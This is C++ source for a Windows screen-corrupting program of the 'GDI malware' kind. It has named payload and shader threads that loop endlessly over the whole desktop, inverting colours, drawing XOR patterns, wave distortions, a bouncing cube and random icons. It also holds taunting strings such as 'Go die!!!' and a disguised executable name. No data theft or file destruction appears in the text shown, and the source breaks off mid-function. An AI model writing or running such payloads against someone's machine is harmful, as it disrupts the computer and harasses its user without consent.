﻿#pragma warning(disable: 4995)
#pragma comment(lib, "Dwmapi.lib")
#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<fstream>
#include<windef.h>
#include<memory>
#include<iosfwd>
#include<dwmapi.h>
#include"resource.h"
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"msimg32.lib")//use lambdaexec Neoarsphenamine\def.h
#pragma optimize("", off)//disable "t>>t" return 0
#define RndRGB RGB(rand() % 255, rand() % 255, rand() % 255)
LPCSTR texts[] = { "L0S3R","What you want to say?","L0L","78915418813141145141919810","Go die!!!","Still using this computer?","This equipment is useless.","by uiui","fitbie54188.exe" };
LPCSTR texts2[] = { "tan()","sin()","cos()","round()","sqrt()","cbrt()","pow(,)","fmod(,)","+","-","*","/","|","&","^","%",">>","<<","()","~","\"\"[]" };
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
LPCSTR iconLibraryNames[] = { "imageres.dll","shell32.dll","moricons.dll","pifmgr.dll" };
using namespace std;
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
typedef struct {
    float x;
    float y;
    float z;
} VERTEX;
struct Point3D {
    float x, y, z;
};
typedef struct {
    int vtx0;
    int vtx1;
} EDGE;
namespace Colors {
    //These HSL functions was made by Wipet, credits to him!(write by pankoza)
    //And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant) {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
    int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
    XFORM xform;
    if (Angle != 0) {
        double fangle = (double)Angle / 180. * 3.1415926;
        xform.eM11 = (float)cos(fangle);
        xform.eM12 = (float)sin(fangle);
        xform.eM21 = (float)-sin(fangle);
        xform.eM22 = (float)cos(fangle);
        xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
        xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
        SetWorldTransform(hdc, &xform);
    }
    return nGraphicsMode;
}
int red, green, blue; bool ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
#define PI 3.14159265358979323846
LPCWSTR GetRandomChar(int length) {
    wchar_t* strRandom = new wchar_t[length + 1];
    for (int i = 0; i < length; i++) {
        strRandom[i] = (rand() % 256) + 1024;
    }
    strRandom[length] = L'\0';
    return strRandom;
}
Point3D RotatePoint(Point3D p, float x, float y, float z) {
    float cosX = cos(x), sinX = sin(x);
    float cosY = cos(y), sinY = sin(y);
    float cosZ = cos(z), sinZ = sin(z);
    float y2 = p.y * cosX - p.z * sinX;
    float z2 = p.y * sinX + p.z * cosX;
    p.y = y2;
    p.z = z2;
    float x2 = p.x * cosY + p.z * sinY;
    z2 = -p.x * sinY + p.z * cosY;
    p.x = x2;
    p.z = z2;
    x2 = p.x * cosZ - p.y * sinZ;
    y2 = p.x * sinZ + p.y * cosZ;
    p.x = x2;
    p.y = y2;
    return(p);
}
VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x + y, x - y, PATINVERT);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
DWORD WINAPI Payload1_BitBlt(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int angle = 0;
    while (1) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 100 * cos(angle * PI / 180.f), 100 * sin(angle * PI / 180.f), w, h, hdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
        angle++; angle %= 360;
    }
}
DWORD WINAPI Shader1_RGB(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            rgbquad[i].rgb += 255;
            rgbquad[i].rgb ^= 9;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader2_XYPointMinus(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                rgbquad[y * w + x].rgb = (x - y) | t;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader3_Wall_th3a(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        COLORREF rgb = RndRGB;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                rgbquad[y * w + x].rgb ^= x ^ y;
                rgbquad[y * w + x].rgb ^= rgb;
            }
        }
        BitBlt(hdc, rand() % 2 ? 1 : -1, rand() % 2 ? 1 : - 1, w, h, hcdc, 0, 0, SRCINVERT);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
void Draw3DCube(HBITMAP bmp, Point3D center, float size, float angleX, float angleY, float angleZ) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    Point3D vertices[8] = {
        {-size, -size, -size},
        {size, -size, -size},
        {size, size, -size},
        {-size, size, -size},
        {-size, -size, size},
        {size, -size, size},
        {size, size, size},
        {-size, size, size},
    };
    POINT screenPoints[8];
    for (int i = 0; i < 8; ++i) {
        Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
        screenPoints[i].x = static_cast<int>(center.x + rotated.x);
        screenPoints[i].y = static_cast<int>(center.y + rotated.y);
    }
    HDC hdc = GetDC(0);
    POINT face[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[1] };
    LOGBRUSH lb{ 0 };
    lb.lbStyle = BS_PATTERN;
    lb.lbHatch = (LONG)bmp;
    HBRUSH hTexBrush = CreateBrushIndirect(&lb);
    SetBrushOrgEx(hdc, screenPoints[0].x, screenPoints[0].y, NULL);
    HBRUSH oldbmp = (HBRUSH)SelectObject(hdc, hTexBrush);
    HPEN hPen = CreatePen(0, 0, 0);
    HPEN oldPen = (HPEN)SelectObject(hdc, hPen);
    Polygon(hdc, face, 4);
    SetBrushOrgEx(hdc, 0, 0, NULL);
    SelectObject(hdc, oldbmp);
    DeleteObject(hTexBrush);
    SelectObject(hdc, oldPen);
    DeleteObject(hPen);
    ReleaseDC(0, hdc);
}
DWORD WINAPI Payload2_ScreenCube_th3b(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    ReleaseDC(0, hdc);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int x = w * wdpi / 96;
    int y = h * hdpi / 96;
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    float x2 = 100.0;
    float y2 = 100.0;
    float angleX = 0.0, angleY = 0.0, angleZ = 0.0;
    float angleIncrement = 0.04;
    float colorA = 0;
    float size = 200;
    for (;;) {
        hdc = GetDC(0); HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h), oldbmp = (HBITMAP)SelectObject(hcdc, bmp);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        x2 += incrementor * signX;
        y2 += incrementor * signY;
        if (x2 + 100 >= w) {
            signX = -1;
            x2 = w - 101;
        }
        else if (x2 <= 100) {
            signX = 1;
            x2 = 101;
        }
        if (y2 + 100 >= h) {
            signY = -1;
            y2 = h - 101;
        }
        else if (y2 <= 100) {
            signY = 1;
            y2 = 101;
        }
        Point3D center = { x2, y2, 0.0f };
        Draw3DCube(bmp, center, size, angleX, angleY, angleZ);
        SelectObject(hcdc, oldbmp);
        DeleteObject(bmp);
        DeleteDC(hcdc);
        ReleaseDC(0, hdc);
        angleX += angleIncrement;
        angleY += angleIncrement;
        angleZ += angleIncrement;
        Sleep(10);
    }
}
DWORD WINAPI Shader4_NoName1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                rgbquad[y * w + x].r -= 99;
                rgbquad[y * w + x].g += 223;
                rgbquad[y * w + x].b -= 114;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
#define P_WALL 0
#define P_XIEBINGER1 1
#define P_XIEBINGER2 2
#define P_I 3
#define P_WANQU 4
#define P_PLUS 5
int easypattern(int x, int y, int w, UINT pattern) {
    int rtn = 0;
    switch (pattern) {
    case P_WALL:
        rtn = x ^ y;
    case P_XIEBINGER1:
        rtn = x | y;
    case P_XIEBINGER2:
        rtn = x & y;
    case P_I:
        rtn = x + w * y;
    case P_WANQU:
        rtn = x * y;
    case P_PLUS:
        rtn = x + y;
    }
    return rtn;
}
DWORD WINAPI Shader5_NoName2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int b = rand() % 6;
                rgbquad[x + w * y].b += GetRValue(easypattern(x, y, w, b));
                b = rand() % 6;
                rgbquad[x + w * y].g += GetGValue(easypattern(x, y, w, b));
                b = rand() % 6;
                rgbquad[x + w * y].r += GetBValue(easypattern(x, y, w, b));
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader6_NoName3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int b = rand() % 6;
                rgbquad[x + w * y].b += GetBValue(x);
                rgbquad[x + w * y].g += GetGValue(x & y * x | y);
                rgbquad[x + w * y].r += GetRValue(x * y);
            }
        }
        BitBlt(hdc, rand() % 3 - 1, rand() % 3 - 1, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader7_Wall2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    int i = 0;
    for (;;) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int signX = x + rand() % 10 - 5, signY = y + rand() % 10 - 5;
                if (signX >= w)signX = signX - w;
                if (signX < 0)signX = w + signX;
                if (signY >= h)signY = signY - h;
                if (signY < 0)signY = h + signY;
                int r = rgbquad[signX + w * signY].rgbRed, g = rgbquad[signX + w * signY].rgbGreen, b = rgbquad[signX + w * signY].rgbBlue;
                rgbquad[x + w * y].rgbRed = r; rgbquad[x + w * y].rgbGreen = g; rgbquad[x + w * y].rgbBlue = b;
            }
        }
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i ^ 4) * pow((x + i) ^ y, (1.0 / 3.0)));
                hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i += 10;
        BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
}
DWORD WINAPI Shader8_NoName4(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += t * (x & y ^ t * (x + w * y));
            }
        }
        StretchBlt(hdc, w, 0, -w, h, hcdc, 0, 0, w, h, NOTSRCERASE);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader9_WallMove_th9a(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb ^= x ^ y;
            }
        }
        BitBlt(hcdc, -20, 0, w, h, hcdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, w - 20, 0, w, h, hcdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload3_Icons_th9b(LPVOID lpParam) {
    int imrNums = (int)ExtractIconA(0, iconLibraryNames[0], -1);
    int shlNums = (int)ExtractIconA(0, iconLibraryNames[1], -1);
    int mriNums = (int)ExtractIconA(0, iconLibraryNames[2], -1);
    int pifNums = (int)ExtractIconA(0, iconLibraryNames[3], -1);
    int icoNums = 6;
    int curNums = 16;
    int zjiNums = 2;
    while (true) {
        int width = rand() % 100;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HICON ico;
        ico = ExtractIconA(0, iconLibraryNames[0], rand() % imrNums);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, width, width, 0, 0, DI_NORMAL);
        DestroyIcon(ico);
        ico = ExtractIconA(0, iconLibraryNames[1], rand() % shlNums);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, width, width, 0, 0, DI_NORMAL);
        DestroyIcon(ico);
        ico = ExtractIconA(0, iconLibraryNames[2], rand() % mriNums);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, width, width, 0, 0, DI_NORMAL);
        DestroyIcon(ico);
        ico = ExtractIconA(0, iconLibraryNames[3], rand() % pifNums);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, width, width, 0, 0, DI_NORMAL);
        DestroyIcon(ico);
        ico = LoadIcon(0, lpIconNames[rand() % icoNums]);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, width, width, 0, 0, DI_NORMAL);
        DestroyIcon(ico);
        ico = LoadIcon(0, lpCursorNames[rand() % curNums]);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, width, width, 0, 0, DI_NORMAL);
        DestroyIcon(ico);
        ico = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(rand() % zjiNums ? IDI_ICON1 : IDI_ICON2));
        DrawIconEx(hdc, rand() % w, rand() % h, ico, width, width, 0, 0, DI_NORMAL);
        DestroyIcon(ico);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader10_Wave(LPVOID lpParam) {
    HDC hdc = GetDC(0); HDC hdcCopy = CreateCompatibleDC(hdc);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sw, ySize = 20;
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = sw;
    bmpi.bmiHeader.biHeight = sh;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    int t = 0;
    while (1) {
        hdc = GetDC(0);
        BitBlt(hdcCopy, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        int i;
        for (i = 0; i < sh * 2; i++) {
            int wave = sin(i / ((float)xSize) * PI) * (ySize);
            BitBlt(hdcCopy, i, 0, 1, sh, hdcCopy, i, wave, SRCCOPY);
        }
        for (i = 0; i < sw * 2; i++) {
            int wave = sin(i / ((float)xSize) * PI) * (ySize);
            BitBlt(hdcCopy, 0, i, sw, 1, hdcCopy, wave, i, SRCCOPY);
        }
        for (int x = 0; x < sw; x++) {
            for (int y = 0; y < sh; y++) {
                int index = y * sw + x;
                int fx = (int)((t ^ 4) * pow((x - t) & (x + y), (1.0 / 3.0)));
                hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmod(fx / 300.f + y / sh * .1f + t / 1000.f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        t += 10;
        BitBlt(hdc, 0, 0, sw, sh, hdcCopy, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload4a_PATINVERTHacthBrush(LPVOID lpParam) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        int rgb = RndRGB;
        HBRUSH hBrush = CreateHatchBrush(4, rgb);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdc, hBrush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        SelectObject(hdc, hOldBitmap);
        DeleteObject(hBrush);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload4b_Move2(LPVOID lpParam) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        BitBlt(hdc, 1, 1, w, h, hdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader11_NoName5(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD prgbScreen = { 0 };
    HDC hdcTempScreen;
    HBITMAP hbmScreen;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    hdcTempScreen = CreateCompatibleDC(hdcScreen);
    hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
    SelectObject(hdcTempScreen, hbmScreen);
    for (int t = 0;; t++) {
        hdcScreen = GetDC(NULL);
        BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int b = GetRValue(prgbScreen[i].rgb);
            int g = GetGValue(prgbScreen[i].rgb);
            int r = GetBValue(prgbScreen[i].rgb);
            prgbScreen[i].rgb = RGB((r + 100) % 239, ((r + g + b) / 4 + t) ^ 256, ((r + g + b) / 4 + i) % 256) % (RGB(255, 255, 255)) + t * 5;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader12_NoName6(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD prgbScreen = { 0 };
    HDC hdcTempScreen;
    HBITMAP hbmScreen;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    BLENDFUNCTION blf = { 0 };
    blf.BlendOp = AC_SRC_OVER;
    blf.BlendFlags = 0;
    blf.SourceConstantAlpha = 128;
    blf.AlphaFormat = 0;
    hdcTempScreen = CreateCompatibleDC(hdcScreen);
    hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
    SelectObject(hdcTempScreen, hbmScreen);
    for (int t = 0;; t++) {
        hdcScreen = GetDC(NULL);
        BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        t *= 50;
        for (int i = 0; i < h; i++) {
            for (int j = 0; j < w; j++) {
                prgbScreen[i * w + j].rgb -= RGB((prgbScreen[i * w + j].r + i / 20) % 255, (prgbScreen[i * w + j].g + j / 20) % 239, (prgbScreen[i * w + j].b + t) % 512) ^ (t / 50);
            }
        }
        AlphaBlend(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, w, h, blf);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader13_NoName7(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD prgbScreen = { 0 };
    HDC hdcTempScreen;
    HBITMAP hbmScreen;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    hdcTempScreen = CreateCompatibleDC(hdcScreen);
    hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
    SelectObject(hdcTempScreen, hbmScreen);
    for (int t = 0;; t++) {
        hdcScreen = GetDC(NULL);
        BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
